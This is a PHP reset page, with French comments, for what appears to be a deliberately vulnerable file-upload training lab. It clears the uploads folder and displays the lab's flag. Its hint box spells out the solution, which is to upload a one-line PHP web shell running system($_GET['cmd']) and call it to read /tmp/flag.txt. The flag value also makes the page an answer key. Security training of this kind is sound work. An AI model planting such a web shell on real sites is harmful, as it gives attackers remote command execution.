<?php
/**
 * Reset Endpoint - OBLIGATOIRE pour DIABLE
 * Réinitialise le lab à son état initial et affiche le flag
 */

header('Content-Type: text/html; charset=UTF-8');

// Fonction pour supprimer récursivement un dossier
function rrmdir($dir) {
    if (is_dir($dir)) {
        $files = scandir($dir);
        foreach ($files as $file) {
            if ($file != "." && $file != "..") {
                if (is_dir("$dir/$file")) {
                    rrmdir("$dir/$file");
                } else {
                    unlink("$dir/$file");
                }
            }
        }
        rmdir($dir);
    }
}

$message = '';
$status = 'success';

try {
    // Chemin du dossier uploads
    $upload_dir = __DIR__ . '/uploads';
    
    // Supprimer tous les fichiers uploadés
    if (is_dir($upload_dir)) {
        $files = scandir($upload_dir);
        $deleted_count = 0;
        
        foreach ($files as $file) {
            if ($file != "." && $file != "..") {
                $filepath = $upload_dir . '/' . $file;
                if (is_file($filepath)) {
                    if (unlink($filepath)) {
                        $deleted_count++;
                    }
                }
            }
        }
        
        $message = "✅ Lab réinitialisé : $deleted_count fichier(s) supprimé(s)";
    } else {
        // Créer le dossier s'il n'existe pas
        mkdir($upload_dir, 0777, true);
        $message = "✅ Dossier uploads créé";
    }
    
    // Lire le flag depuis le fichier
    $flag_file = '/tmp/flag.txt';
    if (file_exists($flag_file)) {
        $flag = trim(file_get_contents($flag_file));
    } else {
        $flag = "FLAG{UPLOAD_SUCCESS_2026}"; // Valeur par défaut si fichier manquant
    }
    
} catch (Exception $e) {
    $status = 'error';
    $message = "❌ Erreur lors de la réinitialisation : " . $e->getMessage();
    $flag = "Erreur de lecture";
}

// Afficher une page de confirmation
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reset - File Upload Lab</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container" style="margin-top: 50px;">
        <div class="upload-card" style="text-align: center;">
            <h1>🔄 Réinitialisation du Lab</h1>
            
            <div class="<?php echo $status === 'success' ? 'success-message' : 'error-message'; ?>" 
                 style="margin: 20px 0; padding: 20px;">
                <?php echo $message; ?>
            </div>
            
            <!-- 🏆 Section Flag -->
            <div style="background: linear-gradient(135deg, #1a1a1a 0%, #2a2a2a 100%); 
                        padding: 25px; 
                        border-radius: 10px; 
                        margin: 25px 0;
                        border: 2px solid #FFD700;
                        box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);">
                
                <h2 style="color: #FFD700; margin-bottom: 15px; display: flex; align-items: center; justify-content: center;">
                    <span style="font-size: 2rem; margin-right: 10px;">🏆</span> FLAG DE VALIDATION
                </h2>
                
                <div style="background: #000; 
                            padding: 20px; 
                            border-radius: 8px; 
                            margin: 15px 0;
                            border: 1px solid #FFD700;">
                    
                    <p style="color: #FFD700; font-size: 1.2rem; margin-bottom: 10px;">🔑 Flag à trouver :</p>
                    
                    <p style="font-family: 'Courier New', monospace; 
                              font-size: 2.2rem; 
                              font-weight: bold;
                              background: #0a0a0a;
                              padding: 15px;
                              border-radius: 5px;
                              color: #00ff00;
                              letter-spacing: 2px;
                              text-shadow: 0 0 10px #00ff00;
                              border: 1px dashed #00ff00;">
                        <?php echo htmlspecialchars($flag); ?>
                    </p>
                    
                    <p style="color: #aaa; margin-top: 10px; font-size: 0.9rem;">
                        ⚡ À communiquer à l'équipe WP1/WP2 quand tu l'as trouvé !
                    </p>
                </div>
                
                <div style="background: #1a1a1a; padding: 15px; border-radius: 5px; text-align: left;">
                    <p style="color: #FFD700; margin-bottom: 5px;">🎯 Comment obtenir ce flag :</p>
                    <ol style="color: #ccc; margin-left: 20px;">
                        <li>Uploader <code style="background: #000; padding: 2px 5px;">shell.php</code> avec le code : <code style="background: #000; color: #0f0;">&lt;?php system($_GET['cmd']); ?&gt;</code></li>
                        <li>Exécuter : <code style="background: #000; color: #0f0;">http://localhost:8080/uploads/shell.php?cmd=cat%20/tmp/flag.txt</code></li>
                        <li>Le flag s'affiche dans la réponse</li>
                    </ol>
                </div>
            </div>
            
            <a href="index.php" class="btn-primary" style="display: inline-block; text-decoration: none; margin-top: 10px;">
                Retour à l'accueil
            </a>
            
            <p style="margin-top: 20px; color: var(--text-secondary);">
                <small>Le lab est maintenant dans son état initial. Tous les fichiers uploadés ont été supprimés.</small>
            </p>
        </div>
    </div>
</body>
</html>
